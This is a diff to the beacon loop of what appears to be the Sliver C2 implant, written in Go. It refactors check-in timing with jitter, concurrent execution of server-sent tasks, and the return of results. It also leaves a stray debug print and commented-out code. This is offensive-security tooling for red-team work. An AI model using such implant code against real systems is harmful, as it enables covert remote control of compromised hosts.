@@ -20,6 +20,7 @@ package c2
 
 import (
 	"errors"
+	"fmt"
 	"log"
 	insecureRand "math/rand"
 	"sync"
@@ -44,39 +45,18 @@ func init() {
 	BeaconID = id.String()
 }
 
-// Beacon - The most basic Beacon-style C2 channel interface. All beacons Must implement this interface.
-type Beacon interface {
-	// Action
-	// Start() error                // Start handling a beacon-style C2 channel with its appropriate parameters
-	Recv() (*pb.Envelope, error) // Receive a a task from the server
-	Send(*pb.Envelope) error     // Send the results or part of a task output back to server
-	Close() error                // Close an C2 beacon channel instance. Might be many calls
-
-	// Parameters
-	Interval() int64
-	Jitter() int64
-	Duration() time.Duration
-}
-
-// StartBeacon - Start the beacon transport. Equivalent to StartSession()
-func (t *C2) StartBeacon() (err error) {
-
-	// Enter the beaconing loop and run each connection run in the background.
-	// Only exits when we have reached the maximum number of connection failures.
-
-	return
-}
-
 // ServeBeacon - Loop and continuously perform
 // beaconing according to the transport settings.
 func (t *C2) ServeBeacon() {
 
 	// Create a new beacon base type, which is passed to specialized C2 channels
+	t.mutex.RLock()
 	t.Beacon = &beacon{
 		interval:   t.Profile.Interval,
 		jitter:     t.Profile.Jitter,
 		connection: t.Connection,
 	}
+	t.mutex.RUnlock()
 
 	for {
 		// Only exits when we have reached the maximum number
@@ -85,45 +65,54 @@ func (t *C2) ServeBeacon() {
 			return
 		}
 
+		duration := t.Duration()
+
 		// Run a beaconing process (connect, set up RPC, process tasks)
 		// In the background so that if tasks do not complete, does not
 		// block any next runs and their associated tasks.
-		go t.HandleBeaconTasks()
+		go t.HandleBeaconTasks(duration)
+
+		// {{if .Config.Debug}}
+		log.Printf("[beacon] sleep until %v", time.Now().Add(duration))
+		// {{end}}
+		time.Sleep(duration)
 	}
 }
 
 // HandleBeaconTasks - Listens for tasks, executes them and sends the results in the background,
-func (t *C2) HandleBeaconTasks() {
+func (t *C2) HandleBeaconTasks(duration time.Duration) {
 
 	// Setup the physical connection if needed (will return without errors if not)
-	if t.Conn == nil {
-		err := t.startTransport()
-		if err != nil {
-			// {{if .Config.Debug}}
-			log.Printf("Error starting connection: %s", err)
-			// {{end}}
-			t.FailedAttempt()
-			return
-		}
+	// if t.Conn == nil {
+	err := t.startTransport()
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("Error starting connection: %s", err)
+		// {{end}}
+		t.FailedAttempt()
+		return
 	}
+	// }
 
 	// Setup the session connection. This is always needed
-	if t.Connection == nil {
-		err := t.StartSession()
-		if err != nil {
-			// {{if .Config.Debug}}
-			log.Printf("Error setting up connection: %s", err)
-			// {{end}}
-			t.FailedAttempt()
-			return
-		}
+	// if t.Connection == nil {
+	err = t.StartSession()
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("Error setting up connection: %s", err)
+		// {{end}}
+		t.FailedAttempt()
+		return
 	}
+	// }
+	t.Beacon.connection = t.Connection // TODO: more elegant than this assignment ?
+	defer t.Connection.Close()
 
 	// {{if .Config.Debug}}
 	log.Printf("[beacon] sending check in ...")
 	// {{end}}
-	nextCheckin := time.Now().Add(t.Beacon.Duration())
-	err := t.Beacon.Send(Envelope(pb.MsgBeaconTasks, &pb.BeaconTasks{
+	nextCheckin := time.Now().Add(duration)
+	err = t.Beacon.Send(Envelope(pb.MsgBeaconTasks, &pb.BeaconTasks{
 		ID:          BeaconID,
 		NextCheckin: nextCheckin.UTC().Unix(),
 	}))
@@ -164,17 +153,13 @@ func (t *C2) HandleBeaconTasks() {
 	}
 
 	// Start executing all tasks concurrently, and wait until they complete.
-	wg := &sync.WaitGroup{}
-	results := t.ExecuteBeaconTasks(wg, tasks.Tasks)
+	results := t.ExecuteBeaconTasks(tasks.Tasks)
 
-	// {{if .Config.Debug}}
-	log.Printf("[beacon] waiting for task(s) to complete ...")
-	// {{end}}
-	wg.Wait() // Wait for all tasks to complete
 	// {{if .Config.Debug}}
 	log.Printf("[beacon] all tasks completed, sending results to server")
 	// {{end}}
 
+	fmt.Printf("Tasks: %d", len(results))
 	err = t.Beacon.Send(Envelope(pb.MsgBeaconTasks, &pb.BeaconTasks{
 		ID:    BeaconID,
 		Tasks: results,
@@ -191,7 +176,8 @@ func (t *C2) HandleBeaconTasks() {
 
 // ExecuteBeaconTasks - Concurrently performs all the tasks in a request and
 // populate the results. This blocks until all goroutines have finished.
-func (t *C2) ExecuteBeaconTasks(wg *sync.WaitGroup, tasks []*pb.Envelope) (results []*pb.Envelope) {
+func (t *C2) ExecuteBeaconTasks(tasks []*pb.Envelope) (results []*pb.Envelope) {
+	wg := &sync.WaitGroup{}
 	resultsMutex := &sync.Mutex{}
 
 	// Register commands compatible with beacons.
@@ -237,19 +223,12 @@ func (t *C2) ExecuteBeaconTasks(wg *sync.WaitGroup, tasks []*pb.Envelope) (resul
 			resultsMutex.Unlock()
 		}
 	}
-	return
-}
+	// {{if .Config.Debug}}
+	log.Printf("[beacon] waiting for task(s) to complete ...")
+	// {{end}}
+	wg.Wait()
 
-// registerBeacon - Prepare a beacon registration message.
-func (t *C2) registerBeacon() *pb.Envelope {
-	nextBeacon := time.Now().Add(t.Beacon.Duration())
-	return Envelope(pb.MsgBeaconRegister, &pb.BeaconRegister{
-		ID:          BeaconID,
-		Interval:    t.Beacon.Interval(),
-		Jitter:      t.Beacon.Jitter(),
-		Register:    t.registerSliver(),
-		NextCheckin: nextBeacon.UTC().Unix(),
-	})
+	return
 }
 
 // beacon - base beaconing implementation: connection setup and orchestration logic
@@ -288,36 +267,65 @@ func (b *beacon) Send(envelope *pb.Envelope) error {
 // Close an C2 beacon channel instance. This base implementation kills the
 // underlying connection if there is one, and returns. This allows transparent
 // control over all net.Conn based transports
-func (b *beacon) Close() error {
+// func (b *beacon) Close() error {
+//         // {{if .Config.Debug}}
+//         log.Printf("[beacon] closing ...")
+//         // {{end}}
+//         if b.connection != nil {
+//                 return b.connection.Close()
+//         }
+//         return nil
+// }
+
+func (t *C2) Close() error {
 	// {{if .Config.Debug}}
 	log.Printf("[beacon] closing ...")
 	// {{end}}
-	if b.connection != nil {
-		return b.connection.Close()
+	if t.Connection != nil {
+		return t.Connection.Close()
 	}
 	return nil
 }
 
 // Parameters
-func (b *beacon) Interval() int64 {
-	return b.interval
-}
+// func (b *beacon) Interval() int64 {
+//         return b.interval
+// }
+//
+// func (b *beacon) Jitter() int64 {
+//         return b.jitter
+// }
 
-func (b *beacon) Jitter() int64 {
-	return b.jitter
-}
-
-func (b *beacon) Duration() time.Duration {
+func (t *C2) Duration() time.Duration {
+	p := t.Profile
 	// {{if .Config.Debug}}
-	log.Printf("Interval: %v Jitter: %v", b.Interval(), b.Jitter())
+	log.Printf("Interval: %v Jitter: %v", p.Interval, p.Jitter)
 	// {{end}}
 	jitterDuration := time.Duration(0)
-	if 0 < b.Jitter() {
-		jitterDuration = time.Duration(int64(insecureRand.Intn(int(b.Jitter()))))
+	if 0 < p.Jitter {
+		jitterDuration = time.Duration(int64(insecureRand.Intn(int(p.Jitter))))
 	}
-	b.duration = time.Duration(b.Interval()) + jitterDuration
+	duration := time.Duration(p.Interval) + jitterDuration
 	// {{if .Config.Debug}}
-	log.Printf("Duration: %v", b.duration)
+	log.Printf("Duration: %v", duration)
 	// {{end}}
-	return b.duration
+	return duration
 }
+
+// func (b *beacon) Duration() time.Duration {
+//         if b == nil {
+//                 fmt.Println("NIL")
+//         }
+//         // {{if .Config.Debug}}
+//         log.Printf("Interval: %v Jitter: %v", b.Interval(), b.Jitter())
+//         // {{end}}
+//         jitterDuration := time.Duration(0)
+//         if 0 < b.Jitter() {
+//                 jitterDuration = time.Duration(int64(insecureRand.Intn(int(b.Jitter()))))
+//         }
+//         b.duration = time.Duration(b.Interval()) + jitterDuration
+//         // {{if .Config.Debug}}
+//         log.Printf("Duration: %v", b.duration)
+//         // {{end}}
+//         return b.duration
+// }
